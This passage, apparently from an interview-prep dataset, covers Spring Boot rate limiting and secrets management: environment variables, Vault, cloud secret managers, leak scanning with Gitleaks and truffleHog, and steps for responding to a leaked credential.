- 3 instances, limit 100/min/client
- Attacker sends 100 to each -> 300/min without tripping any single counter
- Provides false security in scaled deployments

**Redis-based implementation**
- Bucket4j + Redis: `Bandwidth.simple(100, Duration.ofMinutes(1))`
- Resilience4j RateLimiter: `limitForPeriod(100).limitRefreshPeriod(Duration.ofMinutes(1))`
- Both use atomic ops; safe across instances

**Brute-force protection for login**
- Track failures per username in Redis with TTL
- After N failures: lock account temporarily, alert via email
- CAPTCHA after 3-5 failures — blocks bots without locking legitimate users

**Key selection**
- Prefer authenticated user ID or API key (stable, non-spoofable)
- IP only as fallback for unauthenticated endpoints
- For login: combine IP + username keys

**Algorithms**
- Token bucket (Bucket4j): allows bursts, matches real traffic
- Sliding window: precise, no boundary exploitation
- Fixed window: simplest; boundary issue acceptable for security limits

**Layers**
- CDN/WAF for volumetric DDoS
- API gateway for coarse limits
- Spring filter for fine-grained per-endpoint limits
- Account lockout for auth-specific protection

questions.question: How should secrets and credentials be managed in a Spring Boot application — why should you never hardcode them?
questions.title: Secrets Management — Never Hardcode Credentials
questions.direct_answer: Hardcoding credentials exposes them in **version control history, build artifacts, and logs** — even after removal, they live in git history forever. Spring Boot apps should read secrets from **environment variables**, **Spring Cloud Config Server**, or a dedicated **secrets manager** (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager, Kubernetes Secrets). The principle: **secrets never appear in source control at any point**. Use IAM roles instead of API keys where possible, rotate on suspected compromise, scan git history with **truffleHog/Gitleaks**, and treat `.gitignore` as a forward-only safeguard — it doesn't remove already-committed history.

interviewer_intent.testing: Whether the candidate understands the lifecycle risk of hardcoded secrets and knows production-grade secrets management patterns.
interviewer_intent.common_mistake: Moving secrets to application.properties files and still committing them to git, or using .gitignore without understanding it doesn't remove already-committed history.
interviewer_intent.to_stand_out: Discuss secret rotation, least-privilege IAM roles for cloud secrets access, scanning git history for leaked secrets with tools like truffleHog, and the 12-factor app principle of environment-based config.

sections.title: Moving Secrets to application.properties Is Still Hardcoding
sections.content:
Developers who notice hardcoded credentials are bad often "fix" it by moving them to `application.properties` or `application.yml`.
- **If those files are committed, the secrets are still in the repo** — in every clone, fork, backup, and CI artifact.
- Adding to `.gitignore` after committing prevents future commits but **doesn't remove history**. `git log -p -- application.properties` shows every historical version, including last Tuesday's password.

Real secrets management means **secrets never exist in the codebase at any point**. They're injected at runtime from an encrypted, access-controlled, audited source. Three mechanisms span the spectrum from simple to enterprise-grade:

**Environment variables** — 12-factor app standard. Work everywhere (bare metal, Docker, K8s, Lambda). Spring resolves `${VAR}` automatically. Limitation: visible in `ps auxe`, sometimes logged by orchestration. Better than hardcoding; not as good as a dedicated manager.

**Cloud secret managers** (AWS Secrets Manager, Azure Key Vault, GCP Secret Manager) — encrypted storage, IAM-based access, audit logging, automatic rotation. Application identity (instance role, K8s service account, Lambda execution role) grants access — no API keys needed.

sections.title: Environment Variables, Cloud Secrets, and Vault: The Production Hierarchy
sections.content:
**Environment variables — the baseline:**

```yaml
spring:
  datasource:
    url: ${DB_URL}
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: ${JWT_ISSUER_URI}
```

- File contains only placeholders — safe to commit
- Actual values from environment at runtime
- Spring Boot maps `SPRING_DATASOURCE_PASSWORD` to `spring.datasource.password` automatically

**AWS Secrets Manager with Spring Cloud:**
- Add `spring-cloud-aws-secrets-manager-config`
- Configure: `spring.config.import=aws-secretsmanager:/myapp/production`
- Spring fetches secrets at startup, exposes as Spring properties
- EC2/ECS task role permits `secretsmanager:GetSecretValue` on specific ARN — no access keys

**HashiCorp Vault — infrastructure-agnostic:**
- `spring-cloud-starter-vault-config`
- Connects to Vault on startup, authenticates via app identity (K8s service account, AWS IAM, Vault AppRole)
- Audit log records every secret access (timestamp, identity, secret path)
- Supports dynamic secrets (Vault generates short-lived DB credentials per request)

**Kubernetes pattern:**
- Mount secrets as **files** (not env vars) into containers — `spec.volumes` + `volumeMounts`
- Files invisible in process listings
- **External Secrets Operator** fetches from AWS/Vault and creates K8s Secrets — keeps cluster as consumer, not source of truth

sections.title: Secret Rotation, Leak Detection, and Incident Response
sections.content:
**Secret rotation — change credentials without downtime:**
- AWS Secrets Manager supports automated rotation via Lambda
- Lambda creates new credential at source (DB, API), updates Secrets Manager, phases out old
- `@RefreshScope` beans pick up new values without restart
- HikariCP needs explicit reconnection logic — pool maintains connections with old credentials

**Leaked secret detection in Git history:**
- **truffleHog** — scans entire git history for high-entropy strings and known secret patterns
- **git-secrets** (AWS tool) — blocks commits matching configurable patterns
- **Gitleaks** — rule-based scanning with extensive pattern coverage

**CI integration:**

```bash
gitleaks detect --source . --log-opts="HEAD~1..HEAD"
```

**If a secret is leaked, respond immediately:**

1. **Rotate the credential at the source** — change password, regenerate API key. Leaked credential becomes useless.
2. **Remove from Git history**: `git filter-repo --path application.properties --invert-paths` or BFG Repo-Cleaner. Deleting in a new commit leaves it fully visible in history.
3. **Audit access logs at the secret source** (DB auth logs, API key access logs) — determine if the secret was used by unauthorized parties.
4. **Force-push cleaned history** and notify all clones to reclone — old clones retain the leaked history.

**Detect proactively:**
- GitHub secret scanning (built-in for public repos)
- Pre-receive hooks reject commits with detected secrets
- Secret rotation cadence (every 90 days for high-value secrets)

sections.title: Local Development Secrets Without Compromising Production
sections.content:
**The `.env` file pattern (standard for local dev):**
- Create `.env` at project root with local values
- Add `.env` to `.gitignore`
- Commit `.env.example` with placeholder values + comments

```bash
# .env.example — commit this
DB_URL=jdbc:postgresql://localhost:5432/myapp_dev
DB_USERNAME=<your_dev_db_username>
DB_PASSWORD=<generate_locally_from_docker-compose>
JWT_ISSUER_URI=http://localhost:9090
```

**Loading `.env` into Spring Boot:**
- Spring Boot doesn't load `.env` natively
- Use `io.github.cdimascio:java-dotenv` to load into system properties at startup
- OR Docker Compose's `env_file` directive loads `.env` automatically

**Docker Compose for local infrastructure:**

```yaml
services:
  postgres:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: dev_password
```

- Eliminates need for production credentials in local dev
- Non-production passwords are fine to commit

**External services in local dev:**
- Use the provider's sandbox/test environment with separate test credentials (Stripe, Sendgrid)
- Never use production API keys locally — risk of accidental data access or charges

**Least-privilege team access:**
- Each developer's local env has minimum credentials needed for the features they're working on
- Reporting feature dev doesn't need payment processing API key
- Scope credentials by feature area where the external service supports it

sections.title: Choosing the Right Tool for Your Context
sections.content:
**Environment variables — minimum viable:**
- Secrets in env vars aren't committed to Git
- Most platforms (K8s, ECS, Heroku) support natively
- Set via `SPRING_DATASOURCE_PASSWORD` (Spring maps env vars to properties)
- OR `DATABASE_PASSWORD` referenced in YAML as `${DATABASE_PASSWORD}`
- Limitations: visible in `ps`, sometimes logged in CI, not rotatable without restart

**HashiCorp Vault — production-grade for self-managed infra:**
- Dynamic secrets (Vault generates short-lived DB credentials with specific perms per request)
- Lease management (credentials expire and must be renewed)
- Audit logging
- Access policies
- `spring-cloud-starter-vault-config` integrates Vault as Spring property source
- Dynamic credentials minimize breach impact — credential expires before exploitation

**Cloud secret managers — appropriate for cloud-native:**
- AWS Secrets Manager, GCP Secret Manager, Azure Key Vault
- Spring Boot starters for each
- AWS supports Lambda-based automatic rotation
- GCP supports versioned secrets with IAM-level access control
- Integrates with IAM roles — no long-lived credentials

**Maturity progression:**
- Env vars in dev / small deploys
- Cloud secret manager when moving to managed cloud
- HashiCorp Vault for multi-cloud, complex rotation, or compliance requiring audit trails
- **Never skip from env vars straight to complex Vault deployments** — operational complexity should match team capacity

sections.title: Secrets Strategy: Helps, Hurts, Watch For
sections.content:
**When env vars help:**
- Simple deployments, small teams
- Container platforms with native secret injection (K8s, ECS, Lambda)
- 12-factor compliance baseline

**When cloud secret managers help:**
- Cloud-native architectures with IAM identity
- Need automatic rotation
- Audit logging for compliance (PCI, HIPAA, SOC2)
- Cross-team secret sharing with access policies

**When Vault helps:**
- Multi-cloud or hybrid environments
- Need dynamic short-lived credentials
- Strict audit requirements
- Centralized secret management across heterogeneous systems

**When it hurts:**
- Vault for a 3-person startup -> operational overhead exceeds value
- Env vars for a 100-microservice deployment -> rotation becomes impossible
- Secrets in K8s Secrets without encryption-at-rest (KMS) -> base64 is not encryption
- Single shared secret across all environments -> blast radius is everything

**Watch for:**
- **Cookie-cutter rotation that misses dependencies** — DB password rotation must coordinate with connection pool reconnect
- **Logs leaking secrets** — sanitize logging frameworks; never log full configs
- **Build artifacts containing secrets** — Docker images, Maven test reports
- **Secrets in error messages or stack traces** — server returns 500 with config dump
- **GitHub Actions / CI logs** — mask sensitive env vars (`add-mask` in Actions)
- **Old developer machines** — when devs leave, credentials they had locally need rotation

sections.title: Key Points
sections.content:
- **Never commit secrets — even briefly** — git history is permanent; deleting in a new commit leaves them in `git log`.
- **Environment variables over `application.properties`** — properties files are usually committed; env vars are runtime-injected.
- **Spring Cloud Vault for centralized management** — secrets fetched at startup, injected as Spring `Environment` properties; rotate without redeploy.
- **Least-privilege IAM roles for cloud secret access** — app role reads only the specific secrets it needs.
- **Rotate immediately on suspected compromise** — only reliable mitigation after a leak; systems that can't rotate quickly have unacceptable blast radius.
- **Scan git history with truffleHog/Gitleaks** — catch leaks before public exposure; integrate into CI pre-receive hooks.
- **Use `.env.example` for local dev** — commit placeholders; gitignore the real `.env`.

sections.title: How to Answer This Verbally
sections.content:
**Why `application.properties` is risky**
- Almost always committed to version control
- Even `application-local.properties` in `.gitignore` is accidentally committed regularly
- Once committed, the secret is in git history — permanently
- Deleting the file does not remove from history

**Safe approaches**

*Environment variables*
- `SPRING_DATASOURCE_PASSWORD=secret`
- Injected by Docker, K8s secrets, or CI platform
- Never in source code

*Kubernetes Secrets*
- Mounted as env vars or files
- Encrypted at rest with KMS
- Not committed to app repo

*HashiCorp Vault + Spring Cloud Vault*
- Secrets fetched from Vault at startup
- `@Value` and `@ConfigurationProperties` work transparently
- Secrets rotate without code changes
- Dynamic short-lived DB credentials

*AWS Secrets Manager / GCP Secret Manager*
- Cloud-native
- IAM controls which service identities can read which secrets
- Lambda-based automatic rotation

**In application code**
- `@Value("${db.password}")` reads from environment — safe if value comes from env var or Vault
- Log sanitization: ensure logging frameworks don't capture `application.properties` values

**Audit and detection**
- `git log --all -S 'password'` on any repo before open-sourcing
- truffleHog / Gitleaks in CI
- GitHub secret scanning (free for public repos)

**Incident response**
- Rotate at source first
- Clean git history (`git filter-repo`, BFG)
- Audit secret-source access logs
- Force-push cleaned history; reclone everywhere

beats.text: Developers who notice hardcoded credentials are bad often "fix" it by moving them to application.properties or application.yml. If those files are committed, the secrets are still in the repo — in every clone, fork, backup, and CI artifact. Adding to .gitignore after committing prevents future commits but doesn't remove history. git log -p -- application.properties shows every historical version, including last Tuesday's password. Real secrets management means secrets never exist.
